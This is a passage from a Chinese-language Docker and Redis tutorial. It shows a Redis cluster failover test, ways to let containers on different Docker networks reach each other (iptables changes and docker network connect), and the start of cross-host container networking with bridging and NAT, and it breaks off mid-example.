#172.18.0.13<--->172.18.0.14
2f69287f52ec7243a0b894491814d2afe28a46d2 172.18.0.15:6379@16379 slave 
0f9bd0d24495f826702a030703896f7690bebdee 0 1595404269581 5 connected
0f9bd0d24495f826702a030703896f7690bebdee 172.18.0.11:6379@16379 myself,master - 0 1595404269000 1 connected 0-5460
c64dfd1bd6c964a3c6425a28f6ab0f0e1bcea1ba 172.18.0.14:6379@16379 slave 
599f69b43a3579ec064b1854680c77997c809470 0 1595404268000 4 connected
9b6ab0b8f75516d6acd9d566d0d349f1fdd29540 172.18.0.12:6379@16379 master - 0
1595404268976 2 connected 5461-10922
599f69b43a3579ec064b1854680c77997c809470 172.18.0.13:6379@16379 master - 0
1595404269481 3 connected 10923-16383
06295ce4884948858cf60243629a595afa461b21 172.18.0.16:6379@16379 slave 
9b6ab0b8f75516d6acd9d566d0d349f1fdd29540 0 1595404268000 6 connected
#添加key到redis-2上
127.0.0.1:6379> set name wang
-> Redirected to slot [5798] located at 172.18.0.12:6379
OK



#添加key到redis-1上
172.18.0.12:6379> set title cto
-> Redirected to slot [2217] located at 172.18.0.11:6379
OK


172.18.0.11:6379> get name
-> Redirected to slot [5798] located at 172.18.0.12:6379
"wang"
172.18.0.12:6379> get title
-> Redirected to slot [2217] located at 172.18.0.11:6379
"cto
```

**测试故障实现 redis cluster高可用性**

```
#模拟redis-2故障
[root@ubuntu1804 ~]#docker stop redis-2
redis-2


#再次查看cluster状态,可以看到redis-2出错
[root@ubuntu1804 ~]#docker exec -it redis-1 /bin/sh
/data # redis-cli -a 123456 --cluster check 127.0.0.1:6379
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
Could not connect to Redis at 172.18.0.12:6379: Host is unreachable
#查看到 172.18.0.16提升为新的master
172.18.0.16:6379 (06295ce4...) -> 1 keys | 5462 slots | 0 slaves.
172.18.0.13:6379 (599f69b4...) -> 0 keys | 5461 slots | 1 slaves.
172.18.0.15:6379 (2f69287f...) -> 1 keys | 5461 slots | 1 slaves.
[OK] 2 keys in 3 masters.
0.00 keys per slot on average.
>>> Performing Cluster Check (using node 127.0.0.1:6379)
S: 0f9bd0d24495f826702a030703896f7690bebdee 127.0.0.1:6379
   slots: (0 slots) slave
   replicates 2f69287f52ec7243a0b894491814d2afe28a46d2
M: 06295ce4884948858cf60243629a595afa461b21 172.18.0.16:6379
   slots:[5461-10922] (5462 slots) master
M: 599f69b43a3579ec064b1854680c77997c809470 172.18.0.13:6379
   slots:[10923-16383] (5461 slots) master
   1 additional replica(s)
M: 2f69287f52ec7243a0b894491814d2afe28a46d2 172.18.0.15:6379
   slots:[0-5460] (5461 slots) master
   1 additional replica(s)
S: c64dfd1bd6c964a3c6425a28f6ab0f0e1bcea1ba 172.18.0.14:6379
   slots: (0 slots) slave
   replicates 599f69b43a3579ec064b1854680c77997c809470
[OK] All nodes agree about slots configuration.
>>> Check for open slots...
>>> Check slots coverage...
[OK] All 16384 slots covered.


/data # redis-cli -a 123456 -c
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
127.0.0.1:6379> cluster nodes
06295ce4884948858cf60243629a595afa461b21 172.18.0.16:6379@16379 master - 0
1595406573128 8 connected 5461-10922
599f69b43a3579ec064b1854680c77997c809470 172.18.0.13:6379@16379 master - 0
1595406572623 3 connected 10923-16383
0f9bd0d24495f826702a030703896f7690bebdee 172.18.0.11:6379@16379 myself,slave 
2f69287f52ec7243a0b894491814d2afe28a46d2 0 1595406571000 1 connected
2f69287f52ec7243a0b894491814d2afe28a46d2 172.18.0.15:6379@16379 master - 0
1595406571614 7 connected 0-5460
9b6ab0b8f75516d6acd9d566d0d349f1fdd29540 172.18.0.12:6379@16379 master,fail -
1595404533839 1595404532528 2 connected
c64dfd1bd6c964a3c6425a28f6ab0f0e1bcea1ba 172.18.0.14:6379@16379 slave 
599f69b43a3579ec064b1854680c77997c809470 0 1595406572118 4 connected
127.0.0.1:6379> get name
-> Redirected to slot [5798] located at 172.18.0.16:6379
"wang"
172.18.0.16:6379> get title
-> Redirected to slot [2217] located at 172.18.0.15:6379
"cto
```

##### 48.8.3.8 同一个宿主机之间不同网络的容器通信

```
开两个容器，一个使用自定义网络容器，一个使用默认brideg网络的容器,默认因iptables规则导致无法通信。
```

![1660147143769](linux体系.assets/1660147143769.png)

```
[root@ubuntu1804 ~]#docker run -it --rm --name test1 alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
       
      
/ # ping 172.27.0.2   #无法ping通自定义网络容器
PING 172.27.0.2 (172.27.0.2): 56 data bytes



[root@ubuntu1804 ~]#docker run -it --rm --network test-net --name test2 alpine sh
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
21: eth0@if22: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
       
/ # ping 172.17.0.2   #无法ping通默认的网络容器
PING 172.27.0.2 (172.17.0.2): 56 data bytes
```

###### 48.8.3.8.1  修改iptables实现同一宿主机上的不同网络的容器间通信

```
#确认开启ip_forward
[root@ubuntu1804 ~]#cat /proc/sys/net/ipv4/ip_forward
1


#默认网络和自定义网络是两个不同的网桥
[root@ubuntu1804 ~]#brctl show
bridge name bridge id STP enabled interfaces
br-c90dee3b7937 8000.0242587cf093 no veth984a5b4
docker0 8000.02429b31732b no veth1a20128


[root@ubuntu1804 ~]#iptables -vnL
Chain INPUT (policy ACCEPT 1241 packets, 87490 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
Chain FORWARD (policy DROP 0 packets, 0 bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
  859 72156 DOCKER-USER all  -- *     *       0.0.0.0/0            0.0.0.0/0 
          
  859 72156 DOCKER-ISOLATION-STAGE-1 all  -- *     *       0.0.0.0/0         
   0.0.0.0/0           
    0     0 ACCEPT     all  -- *     br-c90dee3b7937  0.0.0.0/0           
0.0.0.0/0           ctstate RELATED,ESTABLISHED
    0     0 DOCKER     all  -- *     br-c90dee3b7937  0.0.0.0/0           
0.0.0.0/0           
    0     0 ACCEPT     all  -- br-c90dee3b7937 !br-c90dee3b7937  0.0.0.0/0     
       0.0.0.0/0           
    0     0 ACCEPT     all  -- br-c90dee3b7937 br-c90dee3b7937  0.0.0.0/0       
     0.0.0.0/0           
    0     0 ACCEPT     all  -- *     docker0  0.0.0.0/0            0.0.0.0/0   
        ctstate RELATED,ESTABLISHED
    0     0 DOCKER     all  -- *     docker0  0.0.0.0/0            0.0.0.0/0   
        
    0     0 ACCEPT     all  -- docker0 !docker0  0.0.0.0/0            0.0.0.0/0
    0     0 ACCEPT     all  -- docker0 docker0  0.0.0.0/0            0.0.0.0/0 
          
Chain OUTPUT (policy ACCEPT 1456 packets, 209K bytes)
 pkts bytes target     prot opt in     out     source               destination 
        
Chain DOCKER (2 references)
 pkts bytes target     prot opt in     out     source               destination 
        
Chain DOCKER-ISOLATION-STAGE-1 (1 references)
 pkts bytes target     prot opt in     out     source               destination 
        
  289 24276 DOCKER-ISOLATION-STAGE-2 all  -- br-c90dee3b7937 !br-c90dee3b7937 
0.0.0.0/0            0.0.0.0/0           
  570 47880 DOCKER-ISOLATION-STAGE-2 all  -- docker0 !docker0  0.0.0.0/0       
     0.0.0.0/0           
    0     0 RETURN     all  -- *     *       0.0.0.0/0            0.0.0.0/0   
        
Chain DOCKER-ISOLATION-STAGE-2 (2 references)
 pkts bytes target     prot opt in     out     source               destination 
        
  570 47880 DROP       all  -- *     br-c90dee3b7937  0.0.0.0/0           
0.0.0.0/0           
  289 24276 DROP       all  -- *     docker0  0.0.0.0/0            0.0.0.0/0   
        
    0     0 RETURN     all  -- *     *       0.0.0.0/0            0.0.0.0/0   
        
Chain DOCKER-USER (1 references)
 pkts bytes target     prot opt in     out     source               destination 
        
  859 72156 RETURN     all  -- *     *       0.0.0.0/0            0.0.0.0/0   
        


[root@ubuntu1804 ~]#iptables-save
# Generated by iptables-save v1.6.1 on Sun Feb 2 14:33:19 2020
*filter
:INPUT ACCEPT [1283:90246]
:FORWARD DROP [0:0]
:OUTPUT ACCEPT [1489:217126]
:DOCKER - [0:0]
:DOCKER-ISOLATION-STAGE-1 - [0:0]
:DOCKER-ISOLATION-STAGE-2 - [0:0]
:DOCKER-USER - [0:0]
-A FORWARD -j DOCKER-USER
-A FORWARD -j DOCKER-ISOLATION-STAGE-1
-A FORWARD -o br-c90dee3b7937 -m conntrack --ctstate RELATED,ESTABLISHED -j
ACCEPT
-A FORWARD -o br-c90dee3b7937 -j DOCKER
-A FORWARD -i br-c90dee3b7937 ! -o br-c90dee3b7937 -j ACCEPT
-A FORWARD -i br-c90dee3b7937 -o br-c90dee3b7937 -j ACCEPT
-A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
-A FORWARD -o docker0 -j DOCKER
-A FORWARD -i docker0 ! -o docker0 -j ACCEPT
-A FORWARD -i docker0 -o docker0 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-1 -i br-c90dee3b7937 ! -o br-c90dee3b7937 -j DOCKERISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2
-A DOCKER-ISOLATION-STAGE-1 -j RETURN
-A DOCKER-ISOLATION-STAGE-2 -o br-c90dee3b7937 -j DROP #注意此行规则
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP   #注意此行规则
-A DOCKER-ISOLATION-STAGE-2 -j RETURN
-A DOCKER-USER -j RETURN
COMMIT
# Completed on Sun Feb 2 14:33:19 2020
# Generated by iptables-save v1.6.1 on Sun Feb 2 14:33:19 2020
*nat
:PREROUTING ACCEPT [887:75032]
:INPUT ACCEPT [6:1028]
:OUTPUT ACCEPT [19:1444]
:POSTROUTING ACCEPT [19:1444]
:DOCKER - [0:0]
-A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER
-A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER
-A POSTROUTING -s 172.27.0.0/16 ! -o br-c90dee3b7937 -j MASQUERADE
-A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE
-A DOCKER -i br-c90dee3b7937 -j RETURN
-A DOCKER -i docker0 -j RETURN
COMMIT
# Completed on Sun Feb 2 14:33:19 2020
[root@ubuntu1804 ~]#iptables-save > iptables.rule
[root@ubuntu1804 ~]#vim iptables.rule


#修改下面两行的规则
-A DOCKER-ISOLATION-STAGE-2 -o br-c90dee3b7937 -j ACCEPT
-A DOCKER-ISOLATION-STAGE-2 -o docker0 -j ACCEPT
#或者执行下面命令
[root@ubuntu1804 ~]#iptables -I DOCKER-ISOLATION-STAGE-2 -j ACCEPT
[root@ubuntu1804 ~]#iptables-restore < iptables.rule


#再次两个容器之间可以相互通信
/ # ping 172.27.0.2
PING 172.27.0.2 (172.27.0.2): 56 data bytes
64 bytes from 172.27.0.2: seq=896 ttl=63 time=0.502 ms
64 bytes from 172.27.0.2: seq=897 ttl=63 time=0.467 ms
64 bytes from 172.27.0.2: seq=898 ttl=63 time=0.227 ms


/ # ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=63 time=0.163 ms
64 bytes from 172.17.0.2: seq=1 ttl=63 time=0.232 ms
```

###### 48.8.3.8.2 docker network connect实现同一个宿主机不同网络的容器间通信

**可以使用docker netowrk connect命令实现同一个宿主机不同网络的容器间相互通信**

```
#将CONTAINER连入指定的NETWORK中,使此CONTAINER可以与NETWORK中的其它容器进行通信
docker network connect [OPTIONS] NETWORK CONTAINER
Connect a container to a network
Options:
      --alias strings           Add network-scoped alias for the container
      --driver-opt strings     driver options for the network
      --ip string               IPv4 address (e.g., 172.30.100.104)
      --ip6 string             IPv6 address (e.g., 2001:db8::33)
      --link list               Add link to another container
      --link-local-ip strings   Add a link-local address for the container
      
#将CONTAINER与指定的NETWORK断开连接,使此CONTAINER可以与CONTAINER中的其它容器进行无法通信
docker network disconnect [OPTIONS] NETWORK CONTAINER

Disconnect a container from a network

Options:
  -f, --force   Force the container to disconnect from a network
```

**上面案例中test1和test2的容器间默认无法通信**

```
#每个网络中有属于此网络的容器信息
[root@ubuntu1804 ~]#docker network inspect bridge
[
   {
        "Name": "bridge",
        "Id": 
"c2f770f19400aa482054a92f2ff6ce54cae2ed45a15c7d98e0959c64dfefd58d",
        "Created": "2020-07-22T09:23:20.265208248+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
               {
                    "Subnet": "172.17.0.0/16",
                    "Gateway": "172.17.0.1"
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        "Containers": {
            "9bc707b1a810c4bab39a4c0ed3ff5867cc45b21fe8ae6737f2a9d0163ed2c7a9": 
{
                "Name": "test1",
                "EndpointID": 
"475bba6925c426158b3c523e07b6773c884d404d82e6c19d5e4a41f54f8856c2",
                "MacAddress": "02:42:ac:11:00:02",
                "IPv4Address": "172.17.0.2/16",
                  "IPv6Address": ""
           }
       },
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
       },
        "Labels": {}
   }
]




#每个网络中有属于此网络的容器信息
[root@ubuntu1804 ~]#docker network inspect test-net 
[
   {
        "Name": "test-net",
        "Id": 
"00ab0f2d29e82d387755e1bea19532dc279fa134a565e496d308ec62f7edf434",
        "Created": "2020-07-22T09:59:09.431393706+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": {},
            "Config": [
               {
                    "Subnet": "172.27.0.0/16",
                    "Gateway": "172.27.0.1"
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        "Containers": {
            "c3446876a38b3d7e70ca35429051dea7373643a95689d22f252faedc31f3c427": 
{
                "Name": "test2",
                "EndpointID": 
"13fb11baeca7e90abdc9183334315e95df4a55367d3add1472d741a556cb662c",
                "MacAddress": "02:42:ac:1b:00:02",
                "IPv4Address": "172.27.0.2/16",
                "IPv6Address": ""
           }
       },
        "Options": {},
        "Labels": {}
   }
]
```


**让默认网络中容器test1可以连通自定义网络test-net的容器test2**

```
[root@ubuntu1804 ~]#docker network connect test-net test1
[root@ubuntu1804 ~]#docker network inspect test-net 
[
   {
        "Name": "test-net",
        "Id": 
"00ab0f2d29e82d387755e1bea19532dc279fa134a565e496d308ec62f7edf434",
        "Created": "2020-07-22T09:59:09.431393706+08:00",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": {},
            "Config": [
               {
                    "Subnet": "172.27.0.0/16",
                    "Gateway": "172.27.0.1"
               }
           ]
       },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
       },
        "ConfigOnly": false,
        "Containers": {
            "9bc707b1a810c4bab39a4c0ed3ff5867cc45b21fe8ae6737f2a9d0163ed2c7a9": 
{
                "Name": "test1",
                "EndpointID": 
"600891a1f0727f0fddcb9c123540d02963a30a54d011554e0dfd1c108ecabdd2",
                "MacAddress": "02:42:ac:1b:00:03",
                "IPv4Address": "172.27.0.3/16",
                "IPv6Address": ""
           },
            "c3446876a38b3d7e70ca35429051dea7373643a95689d22f252faedc31f3c427": 
{
                "Name": "test2",
                "EndpointID": 
"13fb11baeca7e90abdc9183334315e95df4a55367d3add1472d741a556cb662c",
                "MacAddress": "02:42:ac:1b:00:02",
                "IPv4Address": "172.27.0.2/16",
                "IPv6Address": ""
           }
       },
        "Options": {},
        "Labels": {}
   }
]



#在test1容器中可以看到新添加了一个网卡,并且分配了test-net网络的IP信息
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
27: eth0@if28: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
29: eth1@if30: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:03 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.3/16 brd 172.27.255.255 scope global eth1
       valid_lft forever preferred_lft forever
#test1可以连接test2容器
/ # ping -c1 172.27.0.2
PING 172.27.0.2 (172.27.0.2): 56 data bytes
64 bytes from 172.27.0.2: seq=0 ttl=64 time=0.100 ms
--- 172.27.0.2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.100/0.100/0.100 ms



#在test2容器中没有变化,仍然无法连接test1
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
^C
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
```

 **让自定义网络中容器test2可以连通默认网络的容器test1**

```
#将自定义网络中的容器test2也加入到默认网络中,使之和默认网络中的容器test1通信
[root@ubuntu1804 ~]#docker network connect bridge test2



#确认自定义网络的容器test2中添加了新网卡,并设置默认网络的IP信息
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
   valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
31: eth1@if32: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.3/16 brd 172.17.255.255 scope global eth1
       valid_lft forever preferred_lft forever
       
       
#test2可以连接test1容器
/ # ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.128 ms
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 packets received, 0% packet loss
round-trip min/avg/max = 0.128/0.128/0.128 ms


#在test1中可以利用test2容器名通信
/ # ping -c1 test2
PING test2 (172.27.0.2): 56 data bytes
64 bytes from 172.27.0.2: seq=0 ttl=64 time=0.076 ms


#在test2中可以利test1容器名通信
/ # ping -c1 test1
PING test1 (172.27.0.3): 56 data bytes
64 bytes from 172.27.0.3: seq=0 ttl=64 time=0.075 ms
```

**断开不同网络中容器的通信**

```
#将test1断开和网络test-net中其它容器的通信
[root@ubuntu1804 ~]#docker network disconnect test-net test1



#在容器test1中无法和test2通信
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
27: eth0@if28: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping -c1 172.27.0.2
PING 172.27.0.2 (172.27.0.2): 56 data bytes
--- 172.27.0.2 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss

#在容器test2中仍能和test1通信
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
31: eth1@if32: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:11:00:03 brd ff:ff:ff:ff:ff:ff
   inet 172.17.0.3/16 brd 172.17.255.255 scope global eth1
       valid_lft forever preferred_lft forever
/ # ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
64 bytes from 172.17.0.2: seq=0 ttl=64 time=0.085 ms


#将test2 断开和默认网络中其它容器的通信
[root@ubuntu1804 ~]#docker network disconnect bridge test2


#在容器test2中无法和test1通信
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
23: eth0@if24: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:ac:1b:00:02 brd ff:ff:ff:ff:ff:ff
   inet 172.27.0.2/16 brd 172.27.255.255 scope global eth0
       valid_lft forever preferred_lft forever
/ # ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2): 56 data bytes
--- 172.17.0.2 ping statistics ---
1 packets transmitted, 0 packets received, 100% packet loss
```

##### 48.8.3.9 跨宿主机的容器之间网络互联

###### 48.8.3.9.1 利用桥接实现跨宿主机的容器间互联(了解)

**缺点：**

```
这个实验我们是把容器的地址故意错开的，可是实际生产环境中地址冲突的可能性非常的大，所以压根不利于推广，所以此实验了解原理即可，没有任何实际的意义。
```

![1660186025950](linux体系.assets/1660186025950.png)

```
#分别将两个宿主机都执行下面操作
[root@ubuntu1804 ~]#apt -y install bridge-utils
[root@ubuntu1804 ~]#brctl addif docker0 eth0


#在两个宿主机上各启动一个容器,需要确保IP不同,相互测试访问
#第一个宿主机的容器
[root@ubuntu1804 ~]#docker run -it --name b1 busybox 
/ # hostname -i
172.17.0.2
/ # httpd -h /data/html/ -f -v
[::ffff:172.17.0.3]:42488:response:200


#第二个宿主机的容器
[root@ubuntu1804 ~]#docker run -it --name b2 busybox 
/ # hostname -i
172.17.0.3
/#wget-q0 - http://172.17.0.2
httpd website in busybox
```

###### 48.8.3.9.2 利用NAT实现跨主机的容器间互联(了解)

**缺点：**

```
手动添加iptables和路由的过程太过于繁琐，当服务器的数量过多的时候添加的过程太过于繁琐，所以一般企业不会使用这种方法
```

**docker跨主机互联实现说明**

```
跨主机互联是说A宿主机的容器可以访问B主机上的容器，但是前提是保证各宿主机之间的网络是可以相互通信的，然后各容器才可以通过宿主机访问到对方的容器。

实现原理: 是在宿主机做一个网络路由就可以实现A宿主机的容器访问B主机的容器的目的。
注意: 此方式只适合小型网络环境，复杂的网络或者大型的网络可以使用google开源的k8s进行互联。
```

**修改各宿主机网段**

Docker默认网段是172.17.0.x/24,而且每个宿主机都是一样的，因此要做路由的前提就是各个主机的网络不能一致。

```
#第一个宿主机A上更改网段
[root@ubuntu1804 ~]#vim /etc/docker/daemon.json 
[root@ubuntu1804 ~]#cat /etc/docker/daemon.json
{
   "bip": "192.168.100.1/24",
  "registry-mirrors": ["https://si7y70hh.mirror.aliyuncs.com"] 
}


[root@ubuntu1804 ~]# systemctl daemon-reload
[root@ubuntu1804 ~]# systemctl restart docker
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:6b:54:d3 brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.101/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe6b:54d3/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e0:ef:72:05 brd ff:ff:ff:ff:ff:ff
   inet 192.168.100.1/24 brd 192.168.100.255 scope global docker0
       valid_lft forever preferred_lft forever
   inet6 fe80::42:e0ff:feef:7205/64 scope link 
       valid_lft forever preferred_lft forever
       
    
    
[root@ubuntu1804 ~]#route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.100.0   0.0.0.0         255.255.255.0   U     0      0        0 docker0
```

**第二个宿主机B更改网段**

```
[root@ubuntu1804 ~]#vim /etc/docker/daemon.json 
{
  "bip": "192.168.200.1/24",
  "registry-mirrors": ["https://si7y70hh.mirror.aliyuncs.com"]
}



[root@ubuntu1804 ~]# systemctl daemon-reload
[root@ubuntu1804 ~]#systemctl restart docker
[root@ubuntu1804 ~]#ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group 
default qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP 
group default qlen 1000
   link/ether 00:0c:29:01:f3:0c brd ff:ff:ff:ff:ff:ff
   inet 10.0.0.102/24 brd 10.0.0.255 scope global eth0
       valid_lft forever preferred_lft forever
   inet6 fe80::20c:29ff:fe01:f30c/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state 
DOWN group default 
   link/ether 02:42:e8:c0:a4:d8 brd ff:ff:ff:ff:ff:ff
   inet 192.168.200.1/24 brd 192.168.200.255 scope global docker0
       valid_lft forever preferred_lft forever
       inet6 fe80::42:e8ff:fec0:a4d8/64 scope link 
       valid_lft forever preferred_lft forever
       
   
[root@ubuntu1804 ~]#route -n
Kernel IP routing table
Destination     Gateway         Genmask         Flags Metric Ref   Use Iface
0.0.0.0         10.0.0.2        0.0.0.0         UG    0      0        0 eth0
10.0.0.0        0.0.0.0         255.255.255.0   U     0      0        0 eth0
192.168.200.0   0.0.0.0         255.255.255.0   U     0      0        0 docker0
```

**在两个宿主机分别启动一个容器**

```
#第一个宿主机启动容器server1
[root@ubuntu1804 ~]#docker run -it --name server1 --rm alpine sh
/ # ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
   inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
16: eth0@if17: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue 
state UP 
   link/ether 02:42:c0:a8:64:02 brd ff:ff:ff:ff:ff:ff
   inet 192.168.100.2/24 brd 192.168.100.255 scope global eth0
       valid_lft forever preferred_lft forever
       
       
/ # route -n
Kernel IP routing table
